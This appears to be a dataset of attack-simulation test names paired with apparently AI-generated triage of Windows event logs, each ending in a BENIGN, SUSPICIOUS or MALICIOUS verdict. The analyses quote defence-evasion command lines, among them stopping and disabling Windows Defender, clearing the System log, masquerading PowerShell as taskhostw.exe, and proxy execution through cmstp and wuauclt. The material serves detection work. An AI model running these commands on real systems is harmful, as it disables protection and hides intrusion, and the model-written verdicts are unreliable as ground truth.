   - There are several time-related events in the System and Security logs that suggest time synchronization actions. The presence of svchost.exe is noted, which is normal as it hosts several Windows services including the Windows Time Service.

3. **Sysmon Log Events:**
   - Multiple logs show executions of `MicrosoftEdgeUpdate.exe`, `wevtutil.exe`, `conhost.exe`, and `PowerShell.exe`. The majority of these process executions map back to Microsoft Edge updates and general system maintenance tasks such as event log management.
   - The process `MicrosoftEdgeUpdate.exe` appears repeatedly, often related to typical update actions, which are expected behaviors for legitimate update mechanisms orchestrated by Microsoft Edge.
   - The command line and user context for these processes do not raise immediate red flags as they are running in a SYSTEM context typically used for updates.

4. **Indicators of Compromise:**
   - No explicit malicious indicators, such as unusual file paths, unknown command-line arguments, or suspicious privileged actions were identified.
   - The scripted PowerShell command seems to directly relate to creating a VM, which could be part of a legitimate administrative or testing routine.

### Conclusion:

- **Assessment**: Based on the analysis, there are no definitive indicators of malicious or suspicious behavior within these logs. The activities recorded, particularly the operations involving PowerShell and system processes like `MicrosoftEdgeUpdate.exe`, are consistent with legitimate administrative actions and system updates.

- **Resolution**: **BENIGN**

If this analysis doesn't align with the expected system usage context (e.g., the creation of a VM was not planned or somewhat undocumented), further inquiry with the relevant administrators or users might be warranted. However, under the current assumptions, the logs demonstrate normal system operation and maintenance activities."
CMSTP Executing Remote Scriptlet,"### Detailed Analysis:

Upon reviewing the provided Windows event logs, several key observations and potential indicators of malicious activity were identified:

#### Suspicious Process Execution:
1. **Command Prompt (cmd.exe) Executed with Unusual Command:**
   - The event with ProcessId `6072` shows `cmd.exe` being run with the command line: `""cmd.exe"" /c cmstp.exe /s ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\src\\data.003.inf""`. 
   - `cmstp.exe` is a legitimate Windows file, but when abused, it can be used for code execution purposes. This specific command line indicates an attempt to execute an INF file, which could potentially conduct malicious activities under the guise of a normal component.
   - Execution of commands from the `Temp` directory could be suspicious, especially if unusual in the context of normal operations.

2. **Frequent Execution of Microsoft Edge Update:**
   - Multiple instances of `MicrosoftEdgeUpdate.exe` are executed in a short period. While the process itself appears to be a legitimate aspect of Microsoft Edge Update, the sheer volume of executions (`EdgeUpdate` processes and their respective services) happening in a condensed timeframe might warrant further scrutiny to rule out potential misuse of legitimate processes.

#### Elevated Processes:
1. **CMD and Sub-processes Run at High Integrity Level:**
   - The processes involving `cmd.exe`, `cmstp.exe`, and `conhost.exe` run with high integrity levels. This elevation level is consistent with sensitive operations, potentially suggesting the need for further investigation to determine whether these privileges were necessary for legitimate operations.

#### Indicators of System Interaction:
1. **Frequent Execution and Process Creation Without Apparent Output:**
   - Processes such as `wevtutil.exe` and others are engaging in operations on the system that don’t immediately yield an expected outcome based on log observations. This might suggest attempts to clear logs or manage event sources without explicit user interaction.

#### Network and System Context:
1. **Logs Don’t Indicate Network Usage:**
   - The captured logs do not provide clear evidence of network interactions or attempts to communicate externally which might be supporting further malicious activities.

### Assessment:
Considering the logs provided, there are elements that raise suspicion about the activities on the host machine. The specific execution of `cmd.exe` with `cmstp.exe` suggests potential misuse that is characteristic of known code-execution techniques. This event could represent an attempt to utilize a legitimate system component to execute unauthorized scripts or commands.

### Resolution: SUSPICIOUS

### Guidance on How to Proceed:
1. **Further Investigate sysmon and cmd Activity:**
   - Conduct a detailed review using additional logs, if available, as well as system forensic tools to determine the origin and intent of the `cmd.exe` and `cmstp.exe` invocation.
   - Analyze further the context within which these processes were initiated, identifying whether they are part of a legitimate software installation or configuration process.

2. **Review File Integrity:**
   - Evaluate the integrity and hash values of the systems files and executables, especially the ones frequently mentioned in the logs.

3. **User and Network Activity Monitoring:**
   - Assess recent user activity and potentially network-based events involving the user `admin_test` and the domain NT AUTHORITY, ensuring access and privilege usage were appropriate for their role.
   - Monitor for any outbound connections that could suggest data exfiltration attempts.

4. **Strengthen Security Posture:**
   - If suspicion persists, consider isolating the affected system and conducting a deeper malware analysis to determine whether there are signs of persistence mechanisms or evidence of data theft.
   - Update security configurations to prevent misuse of system components for further attacks.

Overall, while the logs suggest certain anomalies and potentially unwanted activities, the absence of corroborating external logs makes it imperative to approach this investigation methodically, gathering additional context to draw a final conclusion."
Suppress Win Defender Notifications,"### Log Analysis

Upon reviewing the provided Windows event logs, several points of interest emerge:

#### Anomalous Behavior

1. **Time Change (EventID 4616):**
   - **Description:** Multiple time change events were observed (`EventID: 4616`) with `ProcessName` as `C:\\Windows\\System32\\svchost.exe`. The time seems to have been set back.
   - **Consideration:** While time synchronization can be routine, unexpected time changes can be used to hide malicious activity.

2. **High Privilege Logon (EventID 4672, 4624):**
   - **Description:** The user `admin_test` logged in with multiple privileges (`SeDebugPrivilege`, `SeSecurityPrivilege`, etc.), indicative of a high-privilege session.
   - **Consideration:** Legitimate but warrants further investigation due to the broad range of privileges.

3. **Command Execution:**
   - **Description:** Execution of `cmd.exe` with commands modifying Windows Defender settings (`reg add`).
   - **Consideration:** This can indicate attempts to suppress notifications from Windows Defender or disable its functionality, which is a common tactic used by malware to avoid detection.

4. **Repeated Use of `wevtutil.exe`:**
   - **Description:** Seen several times with `User` as `SERVER002\\admin_test`.
   - **Consideration:** `wevtutil.exe` is a legitimate Windows command-line utility used to manage Windows event logs. Frequent usage may indicate log clearing or manipulation attempts.

5. **Network Connections and Logons:**
   - **Description:** NTLM logons from descriptive machines (`DESKTOP-3HL5B2P`) with an IPv6 address.
   - **Consideration:** Ensure the authenticity of these logons, as NTLM has vulnerabilities that can be exploited in relaying attacks.

6. **Registry Modification:**
   - **Description:** The user `admin_test` performed a registry modification (`Notification_Suppress` on Windows Defender keys). 
   - **Consideration:** This action attempts to disable Windows Defender notifications, which is often associated with malicious intent.

#### Potentially Malicious Indicators

- **Privilege Escalation and Windows Defender Modification:** The combination of high-privilege usage and attempts to modify system defenses is highly suspect.

Masquerading - powershell.exe running as taskhostw.exe,"Based on the analysis of the provided Windows event logs from the host ""Server002"", there are several notable observations that potentially indicate suspicious or malicious activity.

### Key Observations:

1. **Execution of Powershell via an Unsuspected Binary**:
   - The logs reveal that `taskhostw.exe` is being used as a host application for PowerShell commands. `taskhostw.exe` is a legitimate Windows process, but its location under `C:\Users\admin_test\AppData\Roaming\` is unconventional and suspicious, indicating a possible masquerading or a living-off-the-land (LotL) technique for executing PowerShell commands stealthily.
   - Logs such as `EventID: 600` in the ""Windows PowerShell"" log show PowerShell instances with `HostApplication` set to this suspicious path.

2. **Malicious Command Execution**:
   - In the Sysmon logs, there is a concerning command being executed by `cmd.exe` that copies `powershell.exe` to the `AppData` directory as `taskhostw.exe`:
     ```
     CommandLine: ""cmd.exe"" /c copy %%windir%%\\System32\\windowspowershell\\v1.0\\powershell.exe %%APPDATA%%\\taskhostw.exe /Y & cmd.exe /K %%APPDATA%%\\taskhostw.exe
     ```
   - This activity reflects a classic example of process masquerading and unauthorized file manipulation, indicative of potential malware.

3. **Privilege Escalation and High-Integrity Process Execution**:
   - There are multiple `Sysmon` entries showing processes executing with High Integrity Level, particularly processes associated with unusual paths or commands.
   - The security event logs show multiple privilege assignments (EventID: 4672), which could suggest privilege escalation activities, especially with accounts linked to process executions that should not need such privileges (e.g., `admin_test`).

4. **Potential Indicators of Persistence or Lateral Movement**:
   - The repeated execution of certain processes (`taskhostw.exe`) and the suspicious command lines may reflect efforts to establish persistence or move laterally within the network.

### Assessment:

- **Resolution**: **MALICIOUS**

The activities outlined, especially the manipulation of PowerShell and process masquerading with elevated privileges, are consistent with malicious tactics. The presence of these actions primarily indicates an attempt to execute unauthorized code while bypassing security controls, suggesting potential compromises such as malware installation or active cyber espionage efforts.

### Recommendations:

1. **Immediate Action**:
   - Initiate an incident response protocol to isolate and investigate the affected host ""Server002"".
   - Examine network traffic and other connected systems for similar patterns of behavior, indicating lateral movement.

2. **Remediation**:
   - Quarantine the identified suspect file (`taskhostw.exe` in the noted directory) and assess the system for additional unauthorized files or processes.
   - Change all possibly compromised credentials, especially those with elevated privileges.

3. **Security Enhancement**:
   - Enhance monitoring on PowerShell and command-line usage, focusing on non-standard paths and elevated privilege usage.
   - Deploy and regularly update endpoint detection and response (EDR) solutions to identify and block similar future threats.

This assessment concludes that the activities identified in the logs indicate a potential compromise, necessitating immediate attention and comprehensive investigation."
Load Arbitrary DLL via Wuauclt (Windows Update Client),"Based on the analysis of the provided Windows event logs, here are the observations and findings regarding the potential indicators of malicious activity:

### Observations:
1. **Process Executions**:
   - Multiple executions of `powershell.exe`, `conhost.exe`, and `wevtutil.exe` by the user `SERVER002\admin_test`.
   - `wuauclt.exe` is executed with a suspicious command line: `wuauclt.exe /UpdateDeploymentProvider ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\bin\calc.dll"" /RunHandlerComServer`. This is an unusual use of `wuauclt.exe`, which typically manages Windows updates, not DLLs in temporary directories.

2. **Command Lines**:
   - The use of `cmd.exe /c wuauclt.exe ...` in the command line indicates potential script or command injection aimed at executing `calc.dll` dynamically, which could bypass detection mechanisms.

3. **Privilege Escalations**:
   - Security logs show multiple logons with elevated privileges (Event ID 4672), which are frequent and potentially excessive for normal administrative operations.

4. **Credential Access Activity**:
   - `EventID 5379` indicates account-related operations or accesses which could imply attempts at unauthorized credential access, although the return codes suggest failures.

5. **PowerShell Activities**:
   - Repeated usage of PowerShell without specific logging from PowerShell event logs missing, but its presence amidst suspicious command lines can imply obfuscation or execution of potentially malicious scripts.

### Assessment:
- The combination of suspicious command-line execution involving `wuauclt.exe` to run a DLL from a non-standard location, frequent execution of PowerShell, and privilege escalation attempts are indicative of potential malicious activity.
- The patterns suggest possible exploitation attempts or actions associated with persistence mechanisms or lateral movement within a network.

### Resolution:
Based on the analysis above, the presence of highly suspicious command lines and process executions, actions indicative of privilege escalation attempts, and potential unauthorized credential access:
- **Resolution**: **MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Response**:
   - Isolate `Server002` from the network to prevent any further potential spread or network reconnaissance.
   - Perform a detailed review and audit of `admin_test` account activities and system changes.

   - Reset credentials, especially for `admin_test`, and review group policies related to credential storage and retrieval.
   - Ensure all Windows updates and patches are applied, and consider enhancements in endpoint protection and monitoring.

4. **Review and Revise Incident Response Process**:
   - Conduct a post-incident review to improve detection and response capabilities based on the malicious activities identified in this case."
Invoke-ATHRemoteFXvGPUDisablementCommand base test,"Upon careful analysis of the provided event logs, I identified certain suspicious activities which warrant further investigation. Here’s a detailed breakdown:

1. **Repeated Security Audit Events (4798 and 4799)**:
   - The `4798` events indicate enumeration of local accounts, and the `4799` events indicate enumeration of local groups. These occurred in rapid succession around `2024-10-25 21:30:31`. Enumeration activities, often indicative of information gathering, might be part of a reconnaissance phase of an attack.
   - The invoking process in each event is `CompatTelRunner.exe`, which usually runs under the `SYSTEM` account for telemetry purposes, but its repeated querying for user and group accounts can be alarming when tied with administrative contexts.

2. **Sysmon Logs (Event ID 5 and 1)**:
   - Multiple entries show `WindowsPowerShell` being initiated by `admin_test`, running scripts that may involve commands like `Invoke-ATHRemoteFXvGPUDisablementCommand`. This command name suggests potential exploitation or vulnerability testing, due to the module involved (`ATHRemoteFXvGPU`).
   - Processes like `conhost.exe` and `wevtutil.exe` (command-line event log utility) are frequently executed by `admin_test`, which together with their context might imply log manipulation or obfuscation attempts.

3. **Privileged Logon Events**:
   - The logs show a logon event (ID 4624) for `NT AUTHORITY\SYSTEM` with elevated privileges (ID 4672). The presence of such an event entry alone isn't suspicious as it's a normal occurrence, but when considered with the surrounding context of PowerShell activities and enumeration by `CompatTelRunner.exe`, it raises a concern.

4. **Use of Whoami and Hostname commands**:
   - The use of `whoami.exe` and `hostname.exe` by `admin_test` could be benign, but in combination with elevated privileges and absence of a clear operational purpose in this context, it could suggest attempts to ascertain environment details for malicious purposes.

5. **PowerShell Logs**:
   - There are multiple logs from PowerShell (event ID 600), highlighting script execution with parameters using the `Invoke-ATHRemoteFXvGPUDisablementCommand` command, hinting at activities focused on RemoteFX graphics processing unit virtualization which is deprecated due to security vulnerabilities.

From the collective insights gathered from these logs, the activities could be potentially harmful:

- **Indicators of Malicious Activity**: The combination of account enumeration, use of PowerShell scripts, system commands together with the administrative user context suggests exploitation or at least preparation for an unauthorized intrusion.
- **Resolution**: This activity is classified as **SUSPICIOUS**.

### Actionable Guidance:
- Conduct a detailed forensic investigation on the activities of `admin_test` user, especially focusing on their PowerShell history and corresponding command lines.
- Review and isolate the system to prevent any further unauthorized access.
- Implement stricter monitoring using a security information and event management (SIEM) system around PowerShell and Privilege Management.
- Consider running a malware and vulnerability scan on the server to identify and mitigate any potential threats.

Given these logs, the situation is suspicious and needs to be escalated to higher-level security teams for comprehensive threat analysis and containment."
Create Windows System File with powershell,"Upon examination of the provided logs, the following observations were made:

### Application Log:
- The entries related to the `edgeupdate` service merely indicate that the service stopped twice without additional context on why it stopped. This is not immediately alarming in isolation, as services may stop due to various benign reasons.

### Sysmon Logs:
- A number of `cmd.exe` processes were initiated by the `admin_test` user. The command line used checks for the existence of a file in the temp directory: `cmd.exe /c IF EXIST %temp%\\data.txt (EXIT 0) ELSE (EXIT 1)`. This could be part of a script or batch process, but without context, it might be unusual.
- The sequence of events involving `conhost.exe` accompanying these `cmd.exe` processes is expected behavior as `conhost.exe` acts as a console window host.
- A `powershell.exe` session was identified executing a script: `Get-Item $env:temp\\data.txt -Force, $file.attributes='System'`. This suggests the script is making changes to a file's attributes in the temp folder, possibly as part of some data modification operation.
- Multiple Sysmon entries describe the execution of Microsoft Edge Update processes. This activity corresponds to automatic software updates, which is typical and expected in many environments.
- No evidence of privilege escalation attempts or known malicious activity patterns was noted.

### Windows PowerShell Logs:
- These logs indicate the execution of a PowerShell session modifying file attributes. This operation coincides with the `Sysmon` log indicating similar activity. While not inherently malicious, the context is not clear from the logs.

### Overall Assessment:
The logs exhibit a range of activities, most of which involve command-line and PowerShell operations. The frequent checking and modification of the `data.txt` file in the temp directory strikes a repetitive pattern, potentially indicating a script operation. However, the absence of known malicious signatures or privilege escalation attempts suggests that the behavior is not overtly malicious but instead somewhat unconventional without additional context or knowledge of user scripts.

**Resolution: SUSPICIOUS**
- **Recommended Action**: Further investigation is needed to determine the origin and intent of the script modifying `data.txt`. Check with administrators or users associated with `admin_test` to verify legitimate use. Review other security logs or indicators of compromise that may correlate with these activities."
Clear Logs,"After reviewing the provided event logs, I have derived the following observations:

1. **Multiple Instances of Command Line Executions**:
   - The Sysmon logs show several invocations of standard diagnostic tools such as `HOSTNAME.EXE`, `whoami.exe`, `conhost.exe`, `cmd.exe`, and `wevtutil.exe`. These are typical command utilities present in Windows systems.
   - The use of `cmd.exe` along with `wevtutil cl System` indicates an attempt to clear the System log. This command is highly suspicious, as it is often used by attackers to cover their tracks after malicious activity. 

2. **Software Updates**:
   - The logs contain numerous entries related to Microsoft Edge Update processes. These entries reflect common update operations executed by the Edge Update utility, such as installation, service invocation, and COM registration.
   - The entries run under the `NT AUTHORITY\SYSTEM` account, which is typical for system service processes.

3. **Unusual Process Activities**:
   - The use of high integrity level and user context (`SERVER002\admin_test`) for the aforementioned command line utilities is notable, suggesting these were executed with administrative permissions.
   - The presence of multiple instances of `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe` with similar logs suggests legitimate update processes or potentially automated deployment/testing of Edge updates.

4. **Service Interactions**:
   - Occurrences related to `edgeupdate` imply typical service start and stop events, which alone do not indicate malicious activity.

**Assessment**:
- The attempt to clear the System event log (`wevtutil cl System`) is a red flag in security incident investigations, often associated with post-exploitation activities.
- The frequent execution of command-line tools with high integrity and administrative privileges raises concerns about their intended usage, potentially indicating reconnaissance or preparation phases in a kill chain pattern.

**Resolution**: **SUSPICIOUS** - The activity related to `cmd.exe /c wevtutil cl System` necessitates immediate further investigation. This could indicate malicious intent to erase traces from logs. The other process executions, in combination with this activity, should be scrutinized for potential misuse or unauthorized access. 

**Guidance**:
- Conduct a thorough review of user activity corresponding to `SERVER002\admin_test` around the logged timestamps.
- Verify whether these occurrences align with authorized administrative practices or schedules within the organization.
- Investigate any anomalous network connections or external communications during the time frame.
- Recommend monitoring Windows event logs for similar future activities and setting alerts for attempts to clear event logs."
DLP Evasion via Sensitive Data in VBA Macro over email,"Upon reviewing the provided event logs, I have identified several entries that necessitate further investigation due to some potentially suspicious activities. Below is a detailed analysis of the logs:

### Analysis:

1. **Sysmon Logs:**
   - Multiple entries show the execution of `wevtutil.exe` and `conhost.exe`. These processes are legitimate system processes; however, the frequent execution of `wevtutil.exe` in quick succession could be abnormal if it is not part of regular tasks like script-automated log management.
   - The most concerning entry is the PowerShell execution with the command `Send-MailMessage` that sends an email with an attachment (`data-cc-macro.xlsm`). Sending email directly via PowerShell might indicate data exfiltration or unauthorized data transmission, especially if unexpected.

2. **PowerShell Logs:**
   - The PowerShell script executed (`Send-MailMessage`) is captured in the logs, confirming the email sending activity with an attached file. 
   - The presence of `Send-MailMessage` might suggest inappropriate use, especially if other indicators of compromise align with suspicious activities.
   
3. **Security Logs:**
   - The presence of event ID 5379 with unsuccessful attempts to access credential information or authenticate via the `MicrosoftAccount` platform indicates potentially unauthorized attempts to access user credentials. These repeated failed attempts could suggest an attempt to leverage or brute-force access.

### Assessment:

- The use of PowerShell for sending an email with attachments and potentially credential-access attempts are activities that exhibit potential indicators of malicious activities.
- While `whoami.exe` and `hostname.exe` executions can be normal, when combined with other activities like the usage of PowerShell for email, it can help build a narrative of profiling and reconnaissance on the host.
  
### Recommendations:

- **Further Investigation**: 
  - Validate whether the email sent via PowerShell with an attachment aligns with any scheduled or legitimate admin tasks. Cross-verify with user or task logs if available.
  - Investigate the context of `wevtutil.exe` executions to ensure they are part of expected scripts or administrative operations.
  - Examine the environment for any unauthorized scripts or malware potentially responsible for sending emails or accessing credential stores.

- **Monitoring and Alerts**:
  - Implement dedicated monitoring for any use of PowerShell scripts that include network or email capabilities, alongside `Send-MailMessage`.
  - Monitor the System Integrity and Execution logs for abnormal patterns or unauthorized script executions.

### Resolution: 

Based on the analysis, there are indicators of potential compromise or suspicious activity requiring further investigation. Therefore, the final resolution is:
- **SUSPICIOUS**: The logs contain activities, such as potentially unauthorized PowerShell script execution aiming to send emails, which are not conclusively malicious but certainly warrant further investigation to rule out any compromise."
Rundll32 setupapi.dll Execution,"In the provided Sysmon logs, we need to analyze the events to determine if there is any suspicious or potentially malicious activity. I will break down noteworthy entries and evaluate them based on common indicators of compromise.

### Noteworthy Entries from the Logs:

1. **Use of `cmd.exe`, `rundll32.exe`, and `wevtutil.exe`:**

   - **`cmd.exe` related events:**
     - **EventID 18017:** The command-line execution using `cmd.exe` involves running `rundll32.exe` with `setupapi.dll,InstallHinfSection DefaultInstall 128` pointing to an INF file located in the `AppData` directory (`data.011_DefaultInstall.inf`). This is suspicious as `rundll32.exe` can be used for legitimate purposes, but it's also commonly used in attack scenarios to execute code, especially when manipulated for executing DLLs or scripts from unusual locations.
     - **EventID 18018 and 18019:** Follow-up with the creation of `conhost.exe` and executing `rundll32.exe`, both being consistent with the command executed.

   - **`wevtutil.exe` occurrences:**
     - The use of `wevtutil.exe`, a command-line utility for managing event logs, without a clear reason might be suspicious. This can often be seen when an attacker tries to clear event logs to cover their tracks. Multiple rapid invocations are particularly noteworthy.

2. **Frequent process creation events:**
   - **`HOSTNAME.EXE` and `whoami.exe`:** 
     - While `hostname.exe` and `whoami.exe` are not inherently malicious, combined with other suspicious activities, they can be used by attackers to ascertain network information and user context.

3. **User Context and Integrity Levels:**
   - All suspicious processes are executed under `SERVER002\admin_test`, with a high integrity level, indicating administrative privileges.

4. **Absence of Other Logs:**
   - The absence of entries in the Application, Security, and System logs is unusual and might suggest tampering or log clearing.

### Assessment:

The sequence of command execution, particularly involving `cmd.exe`, `rundll32.exe`, with an obscure `.inf` file, and the frequent use of `wevtutil.exe` suggest potentially unauthorized activities. Usage of these tools in the manner observed could either imply a legitimate system customization under a privileged user account, or it could be indicative of a more serious security incident, especially when considering the high integrity level executed under an admin account.

### Conclusion:

Given the presence of suspicious command-line activities, frequent use of process creation involving tools that can be weaponized for malicious purposes, and potentially suspicious lack of other logs, the host activities can be classified as:

**Resolution:** **SUSPICIOUS**

### Guidance:

1. **Immediate Actions:**
   - Conduct a deeper inspection on the affected machine, specifically focusing on the file `data.011_DefaultInstall.inf`.
   - Verify the legitimacy of the `SERVER002\admin_test` user account and examine recent account activity logs.
   - Consider isolating the system from the network until further investigation reveals the scope of potential compromise.
   - Check for any known vulnerabilities or misconfigurations in installed software and services, especially those executed or controlled by `cmd.exe` and `rundll32.exe`.

2. **Further Investigation:**
   - Correlate these logs with any network anomalies or attempts to reach external hosts, possibly indicating lateral movement or data exfiltration.
   - Review any alerts or logs from intrusion detection systems or endpoint protection solutions for corroborating evidence.
   - Audit and enforce more stringent log monitoring and alerting for abnormal events and process creations."
Event Viewer Registry Modification - Redirection URL,"Based on the logs provided from different sources on a Windows host, here are some key points and potential indicators of suspicious or malicious activity observed:

1. **Registry Modification:** 
   - An execution of `cmd.exe` with the command line arguments that involve modifying the registry. Specifically, a registry entry is being added with the command:
     ```
     reg add ""HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer"" /v MicrosoftRedirectionURL /t REG_SZ /d ""file://C:\\windows\\system32\\notepad.exe"" /f
     ```
   - This action modifies the ""MicrosoftRedirectionURL"" value under the Event Viewer registry key to point to Notepad, which can be an indicator of a potential scheme to hide logs or redirect legitimate processes for malicious purposes.

2. **Process Execution and Parent-Child Relationships:**
   - Multiple processes such as `whoami.exe`, `conhost.exe`, `cmd.exe`, and `reg.exe` are observed executing under the same `SERVER002\\admin_test` user account with high integrity. The sequence of executed commands (including the registry modification by `cmd.exe`) suggests the actions might be orchestrated by an external actor or script.
   - Parent process is `wsmprovhost.exe`, which is commonly associated with Windows Remote Management and may indicate activity performed remotely or through a script.

3. **Edge Update Activity:**
   - There are several instances of processes related to `MicrosoftEdgeUpdate.exe`. These executions are typical for automatic updates but should be validated to ensure they are a legitimate part of patch management or software updates.
   
4. **Suspicious Behavior:**
   - The combination of executing `cmd.exe` to alter the registry using specific command-line parameters is particularly suspicious. It could be part of a system misconfiguration, unauthorized maintenance, or initial steps in a malicious actor’s attempt to maintain persistence.

**Assessment and Resolution:**
Given these observations, there is evidence of potentially suspicious activity, particularly in the execution of registry modification commands. Such actions are often employed in maintaining persistence or compromising system logs for unauthorized purposes. Therefore, additional investigation is warranted to understand the source of these actions, verify the intention, and validate whether it's part of legitimate administrative tasks or unauthorized activity.

**Recommended Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- **Review Recent Administrative Tasks:** Verify if there are any recent legitimate administrative tasks or scripts that might account for these modifications.
- **Examine Access Logs:** Check for any unusual logins or access patterns around the timestamp of these events.
- **Investigate the Source:** Use endpoint detection tools to trace back the origin or initiating host/IP of the remote activity.
- **Audit Permissions:** Ensure that only authorized users have administrative privileges and investigate usage by the `admin_test` account.
- **Check for Known Indicators:** Search for any known malicious indicators that might correspond to the behavior identified.
- **Containment and Further Analysis:** If unauthorized activity is confirmed, isolate the host and analyze it further to determine the scope and impact of the activities detected."
Activate Windows NoFileMenu Group Policy Feature,"Upon analyzing the provided Windows event logs, here is a detailed breakdown of any suspicious or anomalous activities:

### Suspicious Activities Observed:
1. **Time Modification Events**:
   - The security log and system log show multiple manipulations of the system time by the `svchost.exe` process under the `LOCAL SERVICE` account.
   - Event ID 4616 (Multiple occurrences) shows the time being reverted and set to an earlier time; this might indicate an attempt to manipulate logs or bypass time-based security controls.

2. **Use of Command Line Tools**:
    - The Sysmon log shows the execution of `cmd.exe` with a command `/c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoFileMenu /t REG_DWORD /d 1 /f`. 
    - Modifying registry settings to alter the behavior of the Windows Explorer could be a sign of malicious activity aimed at hiding the presence of malware.

3. **Privilege and Account Observation**:
   - Multiple Event ID 4672 indicate the assignment of special privileges to user `admin_test`.
   - Certain privileges like `SeDebugPrivilege` and `SeTakeOwnershipPrivilege` could potentially be misused for privilege escalation.
  
4. **Execution of WMI Processes**:
    - The frequent execution of `WmiPrvSE.exe` can be normal for system management tasks but warrants attention when noted alongside other suspicious behavior, as it can be used for lateral movement or executing scripts remotely.

### Potential Malicious Activities:
- The `cmd.exe` registry modification command is particularly concerning as it attempts to modify user interface behavior, possibly to prevent users from accessing certain features.
- Timestamp manipulation by `svchost.exe` could be indicative of log tampering. In many attack scenarios, timestamps are altered to throw off investigation timelines.

### Assessment and Resolution:

Based on the investigation findings:

- **Resolution**: **SUSPICIOUS**

### Recommendations:
1. **Conduct a File Integrity Check**: Verify the integrity and authenticity of the `svchost.exe` and ensure it has not been replaced with a malicious variant.
2. **Review User Activities**: Investigate actions performed by `admin_test`, focusing on unauthorized privilege use and potential lateral movement within the network.
3. **Investigate Time Changes**: Correlate the time modifications with other logs to identify potentially masked activities.
4. **Registry Alert**: Set alerts for any crucial registry changes and investigate them promptly to detect ongoing manipulations.
5. **Network Traffic Analysis**: Analyze network traffic for any unusual patterns or connections the host may be initiating.
6. **Enhanced Monitoring**: Increase logging and monitoring of critical systems and processes, especially those running with elevated privileges.

Further investigation is needed. As there is evidence suggesting suspicious behavior, immediate containment and detailed forensic analysis are recommended to determine the full scope of the situation and to confirm or rule out any malicious activity."
Modify EnableNonTPM Registry entry,"### Analysis of Logs:

The collected logs predominantly feature Sysmon logs, which offer a detailed account of system activities, particularly process creations. Here's a breakdown of potentially suspicious activities observed:

1. **Peformance of `wevtutil.exe` and `conhost.exe` Repetitive Execution:**
   - The `wevtutil.exe` is frequently used for Windows Event Log management and can be legitimate in administrative contexts. This sequence is interleaved with frequent calls to `conhost.exe`.
   - However, in environments where this level of log querying is not standard, multiple rapid invocations may suggest log tampering or reconnaissance actions to collect specific event logs without detection.

2. **Command Line Execution Using `cmd.exe`:**
   - A command line process is executed with a command to modify the system registry: `""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableNonTPM /t REG_DWORD /d 1 /f`.
   - The attempt to add or modify registry keys is an indicator of potential system configuration changes without typical administrative oversight, raising suspicion, particularly with the use of `cmd.exe`.

3. **Execution of `whoami.exe` and `hostname.exe`:**
   - These utilities were executed under a context with a high integrity level. While not inherently malicious, it is worth noting, particularly if the execution does not align with standard operations within this environment. They could be part of an enumeration or privilege escalation attempt.

4. **Registry Editing via `reg.exe`:**
   - Further execution of `reg.exe` corroborates potential attempts to adjust system configurations, notably those affecting security settings by allowing usage without TPM (Trusted Platform Module).

5. **Process Initiated from `wsmprovhost.exe`:**
   - The presence of the `wsmprovhost.exe` as the parent process for several commands is significant, especially if Windows Remote Management (WinRM) is not a usual activity. This suggests a potential remote management entry or script executing commands on the host.

### Assessment:

- **Suspicious Activity:**
  - The repetitive execution of log management tools (`wevtutil.exe`) combined with `conhost.exe`, the initiation of suspicious registry modifications, and commands via `cmd.exe` are unusual and warrant deeper scrutiny.
  - The utilities `whoami.exe` and `hostname.exe` execution under high integrity levels raise concern as potentially part of reconnaissance or escalation methods.

### Conclusion:

Given the context and combination of activities (log management tool usage in a potentially non-standard manner, registry modifications, and execution of utilities from a high privilege), the logs indicate **suspicious** activity warranting further investigation. 

### Recommendations:

1. **Conduct Full Audit of Recent Account Activity:**
   - Verify the legitimacy of recent administrative activities on `Server002`.
   - Check for unauthorized access attempts or anomalies in login patterns.

2. **Examine Process Hierarchy and Origin:**
   - Assess the origin of `wevtutil.exe`, `reg.exe`, and `cmd.exe` activities to determine if there's an underlying script or entry method responsible for these actions.

3. **Network Traffic Analysis:**
   - Inspect network logs for unusual outbound connections or data exfiltration attempts.

4. **Revert and Monitor Configuration Changes:**
   - If unauthorized registry changes were confirmed, revert them, and enhance monitoring to capture similar future activities.

Based on the findings here, further forensic and investigative steps should be initiated to ascertain the scope and potential impact of these activities. The resolution stands at **SUSPICIOUS**."
Tamper with Windows Defender Command Prompt,"Upon reviewing the provided log entries, several activities stand out that suggest potentially malicious behavior:

1. **Suspicious Process Execution and Command Line:**
   - In the Sysmon log, there is a command executed via `cmd.exe` to stop the Windows Defender service (`WinDefend`), disable it from starting automatically, and query its status:
     ```
     ""CommandLine"":""\""cmd.exe\"" /c sc stop WinDefend & sc config WinDefend start=disabled & sc query WinDefend""
     ```
   - This set of commands attempts to disable a key security feature on Windows systems and is a common tactic used by malware to avoid detection.

2. **High Integrity Level:**
   - These actions are executed with a high integrity level, indicating administrative privileges (`IntegrityLevel: High`). This suggests that whoever executed these commands had significant control over the system.

3. **User Context:**
   - The actions are performed by the user `SERVER002\\admin_test`. It is unusual for a legitimate user to attempt to disable security features like Windows Defender, indicating that this account may be compromised.

4. **Time Manipulation:**
   - There are events suggesting the system time was manipulated. Time changes can sometimes be used by attackers to evade detection or to coordinate automated tasks.

5. **Repeated Stopping of Services:**
   - Throughout the logs, the service related to ""edgeupdate"" is stopped repetitively, which can sometimes be linked to attempts to disrupt regular update processes or to prevent security patches from applying. However, this activity in isolation is not inherently malicious.
   
Based on the analysis:
- The alteration of the Windows Defender service is a significant indicator of potential malicious activity.
- The context of the actions (use of administrative privileges and disabling security) strongly supports the inference of a compromise.

**Resolution: MALICIOUS**

**Recommendations:**
- Immediately isolate the affected machine from the network to prevent further potential lateral movement or data exfiltration.
- Conduct a full forensic analysis of the system to identify how the compromise occurred and which files might be affected.
- Reset credentials for the `admin_test` account and review additional user accounts for unusual activity.
- Re-enable and update all security tools and ensure patches are applied comprehensively.
- Monitor network traffic for indications of further malicious behavior or communication with known malicious IPs/domains.
- Review and strengthen security measures to mitigate potential vulnerabilities used during the compromise."
Allow RDP Remote Assistance Feature,"Upon reviewing the provided logs from the Windows host, there are several points of interest that merit further discussion. Each log type gives insight into different system activities and their potential risks.

### System Logs:

